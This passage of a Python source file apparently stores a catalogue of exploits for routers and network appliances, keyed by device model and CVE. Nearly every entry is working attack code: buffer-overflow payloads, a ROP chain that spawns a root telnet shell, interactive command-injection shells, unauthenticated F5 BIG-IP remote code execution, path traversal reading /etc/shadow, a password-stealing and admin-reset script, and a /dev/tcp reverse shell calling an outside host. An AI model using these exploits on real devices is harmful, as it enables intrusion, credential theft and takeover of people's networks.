    parser.add_argument('-u', '--user', help='Username for authentication',
                        default='admin')
    parser.add_argument('-p', '--password', help='Password for authentication.',
                        default='')

    args = parser.parse_args()

    exploit_target(args.ip, args.port, args.command, args.user, args.password)
"""
}

model_exp_dic["RT-N53"] = {
    "CVE-2019-20082":
        """ 
#!/usr/bin/env python3

import requests

IP = input('Target IP:').strip()

req = requests

headers = requests.utils.default_headers()
headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"
headers["Referer"] = "http://" + IP + "/"

buf = 'a'*128
payload = {'productid': 'RT-N53', 'current_page': 'Advanced_LAN_Content.asp', 'next_page': '', 'group_id': '', 'modified': '0', 'action_mode': 'apply_new', 'action_script': 'restart_net_and_phy', 'action_wait': '35', 'preferred_lang': 'EN', 'firmver': '3.0.0.4', 'wan_ipaddr_x': '', 'wan_netmask_x': '', 'wan_proto': 'dhcp', 'lan_proto': 'static', 'lan_dnsenable_x': '0', 'lan_ipaddr_rt': '192.168.1.1', 'lan_netmask_rt': '255.255.255.0', 'lan_proto_radio': 'static', 'lan_ipaddr': '192.168.1.1', 'lan_netmask': '255.255.255.0', 'dhcp_start': '192.168.1.2', 'dhcp_end': '192.168.1.254', 'lan_gateway': '0.0.0.0', 'lan_dnsenable_x_radio': '0', 'lan_dns1_x': buf, 'lan_dns2_x':''}

req.post('http://{}/start_apply.htm'.format(IP), headers=headers, data=payload, timeout=10)
print('sent buffer overflow packet')
        """
}

model_exp_dic["Netgear_DGN1000v1"] = {
    "unauth_cmd_inject":
        """
#!/usr/bin/env python3
import requests
import argparse

def send_payload(target_url,syscmd):
    target_url=target_url+"/setup.cgi?todo=syscmd&cmd={0}&curpath=/tmp/&_=1659431647693&currentsetting.htm".format(syscmd)
    print(requests.get(target_url).text)


def generate_url(t_ip,t_port):
    return "http://%s:%s"%(t_ip,t_port)

def vuln_check(target_url):
    target_url = target_url + "/setup.cgi?todo=syscmd&cmd=busybox&curpath=/tmp/&_=1659431647693&currentsetting.htm"
    if "BusyBox" in requests.get(target_url).text:
        print("get shell!!!")
        return True
    else:
        return False

if __name__=="__main__":
    print("NETGEAR (DGN series) mini_httpd unauth attack POC by doudou")
    parser = argparse.ArgumentParser()
    parser.add_argument('-rhost', required=True, type=str, default=None, help='Remote Target Address (IP/FQDN)')
    parser.add_argument('-rport', required=False, type=int, default=80, help='Remote Target Port')
    parser.add_argument('-cmd', required=False, type=str, default=None, help='Command Execute')
    args = parser.parse_args()
    target_url=generate_url(args.rhost,args.rport)
    flag=vuln_check(target_url)
    while(flag):
        print("$ ",end='')
        syscmd=input()
        send_payload(target_url,syscmd)
        
        """
}

model_exp_dic["Netgear_R8300"] = {
    "PSV-2020-0211":
        """
import socket
import time
import sys
from struct import pack
# NETGEAR Nighthawk R8300 RCE Exploit upnpd, tested exploit fw version V1.0.2.130
# Date : 2020.03.09
# POC : system("telnetd -l /bin/sh -p 9999& ") Execute
# Desc : execute telnetd to access router
# by python2
p32 = lambda x: pack("<L", x)
payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7ABBBc9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7DDDBa9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7 AAA Aa9CbEEEECb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4F'
expayload = ''
payload = payload.replace('z3Bz','\\xff\\xff\\x1b\\x40') # Need to Existed Address
payload = payload.replace(' AAA ','\\xf0\\x30\\x02\\x00') #change eip
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bssBase = 0x9E150   #string bss BASE Address
expayload += 'a' * 4550
expayload += p32(bssBase+3) # R4 Register
expayload += p32(0x3F340) # R5 Register //tel
expayload += 'IIII' # R6 Register
expayload += 'HHHH' # R7 Register
expayload += 'GGGG' # R8 Register
expayload += 'FFFF' # R9 Register
expayload += p32(bssBase) # R10 Register
expayload += 'BBBB' # R11 Register
expayload += p32(0x13644) # strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+6) #R4
expayload += p32(0x423D7) #R5  //telnet
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+8) #R4
expayload += p32(0x40CA4 ) #R5  //telnetd\\x20
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+10) #R4
expayload += p32(0x4704A) #R5  //telnetd\\x20-l
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+11) #R4
expayload += p32(0x04C281) #R5  //telnetd\\x20-l/bin/\\x20
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+16) #R4
expayload += p32(0x40CEC) #R5  //telnetd\\x20-l/bin/
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+18) #R4
expayload += p32(0x9CB5) #R5  //telnetd\\x20-l/bin/sh
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+22) #R4
expayload += p32(0x41B17) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x20
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+24) #R4
expayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x2099
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+26) #R4
expayload += p32(0x03FFC4) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+28) #R4
expayload += p32(0x4A01D) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase+30) #R4
expayload += p32(0x461C1) #R5  //telnetd\\x20-l/bin/sh\\x20-p\\x209999\\x20&\\x20\\x00
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x13648) #strcpy
print "[*] Make Payload ..."
expayload += 'd'*0x5c#dummy
expayload += p32(bssBase) #R4
expayload += p32(0x47398) #R5
expayload += 'c'*4 #R6
expayload += 'c'*4 #R7
expayload += 'c'*4 #R8
expayload += 'd'*4 #R10
expayload += p32(0x1A83C) #system(string) telnetd -l
s.connect(('239.255.255.250', 1900))
print "[*] Send Proof Of Concept payload"
s.send('a\\x00'+expayload)#expayload is rop gadget
s.send(payload)
def checkExploit():
soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    ret = soc.connect(('192.168.1.1',9999))
    return 1
except:
    return 0
time.sleep(5)
if checkExploit():
    print "[*] Exploit Success"
    print "[*] You can access telnet 192.168.1.1 9999"
else:
    print "[*] Need to Existed Address cross each other"
    print "[*] You need to reboot or execute upnpd daemon to execute upnpd"
    print "[*] To exploit reexecute upnpd, description"
    print "[*] Access http://192.168.1.1/debug.htm and enable telnet"
    print "[*] then, You can access telnet. execute upnpd(just typing upnpd)"
s.close()
print(Done)
        """
}

model_exp_dic["H3C_magic_R100"] = {
    "stack_overflow":
"""
POST /goform/aspForm HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.0.1
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

GO=a*0x1000
"""
}

model_exp_dic["F5_BIG-IP"] ={
    "CVE-2020-5902":
"""
### Arbitrary file read
curl -k "https://192.168.31.211/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"
curl -k "https://192.168.31.211/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=modify+cli+alias+private+list+command+bash"
#### reverse_shell
curl -k -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "fileName=/tmp/test&content=bash -i > /dev/tcp/192.168.31.56/7856 0>%261 2>%261" "https://192.168.31.211/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp"
curl -k "https://192.168.31.211/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test"
""",
    "CVE_2021_22986":
"""
def POC_1(target_url):
    vuln_url = target_url + "/mgmt/tm/util/bash"
    headers = {
        "Authorization": "Basic YWRtaW46QVNhc1M=",
        "X-F5-Auth-Token": "",
        "Content-Type": "application/json"
    }
    data = '{"command":"run","utilCmdArgs":"-c id"}'
""",
    "CVE-2022-1388":
"""
#!/usr/bin/python3
import argparse
import requests
import urllib3
urllib3.disable_warnings()

def exploit(target, command):
    url = f'https://{target}/mgmt/tm/util/bash'
    headers = {
        'Host': '127.0.0.1',
        'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
        'X-F5-Auth-Token': 'asdf',        
        'Connection': 'X-F5-Auth-Token',
        'Content-Type': 'application/json'
           
    }
    j = {"command":"run","utilCmdArgs":"-c '{0}'".format(command)}
    r = requests.post(url, headers=headers, json=j, verify=False)
    r.raise_for_status()
    if ( r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):
        print(r.json()['commandResult'].strip())
    else:
        print("Response is empty! Target does not seems to be vulnerable..")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
    parser.add_argument('-c', '--command', help='The command to execute')
    args = parser.parse_args()

    exploit(args.target, args.command) 
"""
}

model_exp_dic["DSL-AC3100"] = {
    "CVE-2021-20090":
"""
curl -vk --path-as-is "http://IP/images/..%2findex.htm"
"""
}

model_exp_dic["Tenda_AC6v2"] = {
    "CVE-2022-25445":
"""
####a*0x1000=payload
POST /goform/PowerSaveSet HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1075
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/sleep_mode.html?random=0.37181955385666365&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcmik1qw

powerSavingEn=1&time={payload}%3A00-01%3A00&ledCloseType=allClose&powerSaveDelay=1
"""
}

model_exp_dic["mi_wifi_R3"] = {
    "CVE-2019-18371":
"""
http://192.168.31.1/api-third-party/download/extdisks../etc/shadow
""",
    "CVE-2019-18370":
"""
import os
import tarfile
import requests

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

## get stok
stok = input("stok: ")

## make config file
command = input("command: ")
speed_test_filename = "speedtest_urls.xml"
with open("template.xml","rt") as f:
    template = f.read()
data = template.format(command=command)
# print(data)
with open("speedtest_urls.xml",'wt') as f:
    f.write(data)

with tarfile.open("payload.tar.gz", "w:gz") as tar:
    tar.add("speedtest_urls.xml")

## upload config file
print("start uploading config file ...")
r1 = requests.post("http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(stok), files={"image":open("payload.tar.gz",'rb')}, proxies=proxies)
# print(r1.text)

## exec download speed test, exec command
print("start exec command...")
r2 = requests.get("http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(stok), proxies=proxies)
# print(r2.text)

## read result file
r3 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt", proxies=proxies)
if r3.status_code == 200:
    print("success, vul")
    print(r3.text)
"""
}

model_exp_dic["TL-WR841Nv12_us"] = {
    "CVE-2022-24355":
"""
https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/
""",
    "CVE-2022-30024":
"""
https://www.ddosi.org/cve-2022-30024/
"""
}

model_exp_dic["TL-WDR5620v1"] = {
    "CVE-2019-6487":
"""
#!/usr/bin/python
#this is a POC for TP-LINK WDR5620-V3.0 Command Execution Vulnerability.
#discoverer: Zhiniang Peng from Qihoo 360 Core Security & Fangming Gu
from requests import *

ip      = "192.168.1.1"
url     = "tplogin.cn"
header  = {"Host": "192.168.1.1",
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0",
"Accept": "application/json, text/javascript, */*; q=0.01",
"Content-Type": "application/json; charset=UTF-8",
"X-Requested-With": "XMLHttpRequest",}
stok = "AAAA" # stok is login token
path = "/web-static/test"
def exec_command():
    
    global stok
    global header
        global ip
        global url
    header['Host'] = ip
    data = '{"weather":{"get_weather_observe":{"citycode":"1;'+"whoami>/www/web-static/test"+';","new_pwd":"aaaaa"}},"method":"do"}'
    target_url = "/" + "stok=" + stok + "/ds"
    r = post("http://" + ip + target_url,headers=header,data=data)
    response = get("http://" + ip + path, headers = header)
    print response.content
if __name__ == '__main__':

    exec_command()
"""
}

model_exp_dic["DCS-2530L"] = {
    "CVE-2020-25078":
"""
curl -v http://IP:PORT/config/getuser?index=0
"""
}

model_exp_dic["TOTOLINK_A950RG"] = {
    "CVE-2022-25082":
"""
GET /cgi-bin/downloadFlile.cgi?payload=`ls>../1.txt` HTTP/1.1 
Host: 192.168.111.12 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Cache-Control: max-age=0
"""
}

model_exp_dic["TOTOLINK_T10"] = {
    "CVE-2022-25081":
"""
import requests

while(1):
    print '$',
    a = 'aabb;' + raw_input().replace(' ','$IFS$1') + ';'
    response = requests.get("http://192.168.55.1/cgi-bin/downloadFlile.cgi",params=a)
    print response.text.replace("QUERY_STRING:aabb",'')
""",
    "MQTT_lang_cmd_inject":
"""
import paho.mqtt.client as mqtt

client = mqtt.Client()
client.connect("192.168.55.1",1883,60)
client.publish('totolink/router/setting/setLanguageCfg',payload='{"topicurl":"setting/setLanguageCfg","langType":";echo 123 > /tmp/tmp.txt;"}')
"""
}

model_exp_dic["TOTOLINK_A860R"] = {
    "CVE-2022-37840":
"""
GET /cgi-bin/downloadFlile.cgi?payload=`ls>../1.txt` HTTP/1.1 
Host: 192.168.111.12 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Cache-Control: max-age=0
"""
}


model_exp_dic["Linsys_RE6500"] = {
    "CVE-2020-35714":
"""
#!/usr/bin/env python
#Linksys RE6500 V1.05 - Authenticated command injection Ping page

from requests import Session
import requests
import os
ip="192.168.1.226"
url_codeinjection="http://"+ip+"/goform/systemCommand?pingTestIP=www.google.com&ping_size=32&ping_times=5&command=busybox+telnetd&+"

requestedbody_login="password=0000074200016071000071120003627500015159"

s = requests.Session()

s.headers.update({'Referer': "http://"+ip+"/login.shtml"})
s.post("http://"+ip+"/goform/webLogin",data=requestedbody_login)

s.headers.update({'Referer': "http://"+ip+"/admin/diagnostics.shtml"})

s.get(url_codeinjection)

s.headers.update({'Origin': "http://"+ip})
s.headers.update({'Referer': "http://"+ip+"/admin/startping.shtml"})

s.post("http://"+ip+"/goform/pingstart", data="")
""",
    "CVE-2020-35713":
"""
#!/usr/bin/env python
#Linksys RE6500 V1.0.05.003 and newer - Unauthenticated RCE
#Unsanitized user input in the web interface for Linksys WiFi extender RE6500 allows Unauthenticated remote command execution. 
#An attacker can access system OS configurations and commands that are not intended for use beyond the web UI. 

# Exploit Author: RE-Solver - https://twitter.com/solver_re
# Vendor Homepage: www.linksys.com
# Version: FW V1.05 up to FW v1.0.11.001

from requests import Session
import requests
import os
print("Linksys RE6500, RE6500 - Unsanitized user input allows Unauthenticated remote command execution.")
print("Tested on FW V1.05 up to FW v1.0.11.001")
print("RE-Solver @solver_re")
ip="192.168.1.226"

command="nvram_get Password >/tmp/lastpwd"
#save device password;
post_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"
url_codeinjection="http://"+ip+"/goform/setSysAdm"
s = requests.Session()
s.headers.update({'Origin': "http://"+ip})
s.headers.update({'Referer': "http://"+ip+"/login.shtml"})

r= s.post(url_codeinjection, data=post_data)
if r.status_code == 200:
    print("[+] Prev password saved in /tmp/lastpwd")

command="busybox telnetd"
#start telnetd;
post_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"
url_codeinjection="http://"+ip+"/goform/setSysAdm"
s = requests.Session()
s.headers.update({'Origin': "http://"+ip})
s.headers.update({'Referer': "http://"+ip+"/login.shtml"})

r=s.post(url_codeinjection, data=post_data)
if r.status_code == 200:
    print("[+] Telnet Enabled")

#set admin password
post_data="admuser=admin&admpass=0000074200016071000071120003627500015159&confirmadmpass=admin&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"
url_codeinjection="http://"+ip+"/goform/setSysAdm"
s = requests.Session()
s.headers.update({'Origin': "http://"+ip})
s.headers.update({'Referer': "http://"+ip+"/login.shtml"})
r=s.post(url_codeinjection, data=post_data)
if r.status_code == 200:
    print("[+] Prevent corrupting nvram - set a new password= admin"
"""
}

model_exp_dic["TP_Archer_AX50"] = {
    "CVE-2022-30075":
"""
#!/usr/bin/python3
# Exploit Title: TP-Link Routers - Authenticated Remote Code Execution
# Exploit Author: Tomas Melicher
# Technical Details: https://github.com/aaronsvk/CVE-2022-30075
# Date: 2022-06-08
# Vendor Homepage: https://www.tp-link.com/
# Tested On: Tp-Link Archer AX50
# Vulnerability Description:
#   Remote Code Execution via importing malicious config file

import argparse # pip install argparse
import requests # pip install requests
import binascii, base64, os, re, json, sys, time, math, random, hashlib
import tarfile, zlib
